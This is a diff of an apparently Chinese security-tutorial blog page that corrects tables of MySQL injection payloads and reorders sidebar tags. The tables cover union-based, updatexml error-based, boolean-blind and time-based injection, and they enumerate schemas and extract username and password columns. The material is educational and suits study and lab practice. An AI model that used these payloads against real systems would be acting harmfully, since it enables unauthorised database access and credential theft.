@@ -45,7 +45,7 @@
         content="2021-08-05">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-14">
+        content="2021-08-15">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -416,26 +416,26 @@
 </thead>
 <tbody><tr>
 <td align="left">查库名</td>
-<td align="left"><code>-1 union select 1,2,database()– a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
+<td align="left"><code>-1 union select 1,2,database()-- a</code> 推荐 <br><code>-1 union select 1,2,(select group_concat(0x7e,(schema_name),0x7e) from information_schema.schemata)– a</code></td>
 </tr>
 <tr>
 <td align="left">查表名</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)– a</code></td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(table_name),0x7e) from information_schema.tables where table_schema=&#39;数据库名&#39;)-- a</code></td>
 </tr>
 <tr>
-<td align="left">查字段</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)– a</code></td>
+<td align="left">查列名</td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(column_name),0x7e) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查数据</td>
-<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)– a</code></td>
+<td align="left"><code>-1 union select 1,2,(select group_concat(0x7e,(uname,0x7e,pwd),0x7e) from dede_cms.dede_tb)-- a</code></td>
 </tr>
 </tbody></table>
 <p><strong>注意</strong>：</p>
 <p>1、union select查询列数要与前面列数相同</p>
 <p>2、concat()拼接多列结果，group_concat()拼接多行结果。</p>
 <p>如</p>
-<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,’|’)FROM information_schema.`TABLES` WHERE TABLES_schema=’db_bbs’;),3,4;</span><br></pre>
+<pre class="highlight"><span class="line">SELECT * FROM db_bbs.tb_user UNION SELECT 1,(SELECT group_concat(table_name,&#x27;|&#x27;)FROM information_schema.`TABLES` WHERE TABLES_schema=&#x27;db_bbs&#x27;;),3,4;</span><br></pre>
 
 <p>3、可将查询内容去掉引号，转成16进制形式（前面加上0x）</p>
 <p>4、查表时，建议使用database()，既能避免转义，还可以确定当前有效数据库</p>
@@ -555,19 +555,19 @@
 </thead>
 <tbody><tr>
 <td align="left">查数据库名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)-- a</code> 推荐 <br>或 <br><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(schema_name),1,30) from information_schema.schemata),0x7e),1)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查表名</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(table_name),1,30) from information_schema.tables where table_schema=&#39;数据库&#39;),0x7e),1)-- a</code></td>
 </tr>
 <tr>
-<td align="left">查字段</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)</code></td>
+<td align="left">查列名</td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(column_name),1,30) from information_schema.columns where table_schema=&#39;数据库名&#39; and table_name=&#39;表名&#39;),0x7e),1)-- a</code></td>
 </tr>
 <tr>
 <td align="left">查数据</td>
-<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)</code></td>
+<td align="left"><code>id=1&#39; and updatexml(1,concat(0x7e,(select mid(group_concat(username,0x7e,password),1,30) from &#39;数据库名&#39;.&#39;表名&#39;),0x7e),1)-- a</code></td>
 </tr>
 </tbody></table>
 <h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>条件匹配时返回数据，不匹配时无显示。需要对数据进行猜解（用ascii码进行匹配）</p>
@@ -604,7 +604,7 @@
 </tr>
 <tr>
 <td align="left">获取数据库名</td>
-<td align="left"><code>and ascii((select mid(database(),n,1)))=115 -- a</code></td>
+<td align="left"><code>and ascii((select mid(database(),1,1)))=115 -- a</code></td>
 </tr>
 <tr>
 <td align="left">获取表长度</td>
@@ -615,11 +615,11 @@
 <td align="left"><code>and ascii((select mid(group_conca(table_name),1,1) from information_schema.tables where table_schema=database()))=100 -- a</code></td>
 </tr>
 <tr>
-<td align="left">获取字段长度</td>
+<td align="left">获取列长度</td>
 <td align="left"><code>and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
 </tr>
 <tr>
-<td align="left">获取字段名</td>
+<td align="left">获取列名</td>
 <td align="left"><code>and ascii((select mid(group_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30 -- a</code></td>
 </tr>
 <tr>
@@ -667,11 +667,11 @@
 </thead>
 <tbody><tr>
 <td align="left">获取数据库长度</td>
-<td align="left"><code>and if((length(database()))=8),sleep(3),1)</code> <br>注意：判断长度不需要转ascii码</td>
+<td align="left"><code>and if((length(database()))=8),sleep(3),1)-- a</code> <br>注意：判断长度不需要转ascii码</td>
 </tr>
 <tr>
 <td align="left">获取数据库名</td>
-<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) – a</code></td>
+<td align="left"><code>and if((ascii((select mid(database(),1,1)))=115),sleep(3),1) -- a</code></td>
 </tr>
 <tr>
 <td align="left">获取表长度</td>
@@ -682,11 +682,11 @@
 <td align="left"><code>and if((ascii((select mid(group_concat(table_name),1,1) from information_schema.tables where table_schema=database()))=100),sleep(3),1) -- a</code></td>
 </tr>
 <tr>
-<td align="left">获取字段长度</td>
+<td align="left">获取列长度</td>
 <td align="left"><code>and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
 </tr>
 <tr>
-<td align="left">获取字段名</td>
+<td align="left">获取列名</td>
 <td align="left"><code>and if((ascii((select mid(goup_concat(column_name),1,1) from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;))=30),sleep(3),1) -- a</code></td>
 </tr>
 <tr>
@@ -1040,17 +1040,17 @@
         </div>
       </a>
     
-      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
-        <div class="categories-list-item">
-          环境搭建
-          <span class="categories-list-item-badge">7</span>
-        </div>
-      </a>
-    
       <a href="/categories/Linux/">
         <div class="categories-list-item">
           Linux
           <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">7</span>
         </div>
       </a>
     
@@ -1090,99 +1090,99 @@
   <div class="tags-list">
     
       <a 
-        href="/tags/Access/" 
-        title="Access">
-        <div class="tags-list-item">Access</div>
-      </a>
-    
-      <a 
-        href="/tags/BurpSuite%E4%BB%A3%E7%90%86/" 
-        title="BurpSuite代理">
-        <div class="tags-list-item">BurpSuite代理</div>
-      </a>
-    
-      <a 
-        href="/tags/%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/" 
-        title="绕过Token爆破">
-        <div class="tags-list-item">绕过Token爆破</div>
-      </a>
-    
-      <a 
-        href="/tags/CSRF/" 
-        title="CSRF">
-        <div class="tags-list-item">CSRF</div>
-      </a>
-    
-      <a 
-        href="/tags/HTML/" 
-        title="HTML">
-        <div class="tags-list-item">HTML</div>
-      </a>
-    
-      <a 
-        href="/tags/CSS/" 
-        title="CSS">
-        <div class="tags-list-item">CSS</div>
-      </a>
-    
-      <a 
-        href="/tags/HTTP/" 
-        title="HTTP">
-        <div class="tags-list-item">HTTP</div>
-      </a>
-    
-      <a 
-        href="/tags/JavaScript/" 
-        title="JavaScript">
-        <div class="tags-list-item">JavaScript</div>
-      </a>
-    
-      <a 
-        href="/tags/JBoss/" 
-        title="JBoss">
-        <div class="tags-list-item">JBoss</div>
-      </a>
-    
-      <a 
-        href="/tags/Java/" 
-        title="Java">
-        <div class="tags-list-item">Java</div>
-      </a>
-    
-      <a 
-        href="/tags/MS17-010/" 
-        title="MS17-010">
-        <div class="tags-list-item">MS17-010</div>
-      </a>
-    
-      <a 
         href="/tags/%E9%9A%8F%E8%AE%B0/" 
         title="随记">
         <div class="tags-list-item">随记</div>
       </a>
     
       <a 
-        href="/tags/MSSQL/" 
-        title="MSSQL">
-        <div class="tags-list-item">MSSQL</div>
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
       </a>
     
       <a 
-        href="/tags/Nosql/" 
-        title="Nosql">
-        <div class="tags-list-item">Nosql</div>
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
-        href="/tags/mysql/" 
-        title="mysql">
-        <div class="tags-list-item">mysql</div>
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
       </a>
     
       <a 
-        href="/tags/Oracle/" 
-        title="Oracle">
-        <div class="tags-list-item">Oracle</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" 
+        title="综合靶场">
+        <div class="tags-list-item">综合靶场</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
       </a>
     
   </div>
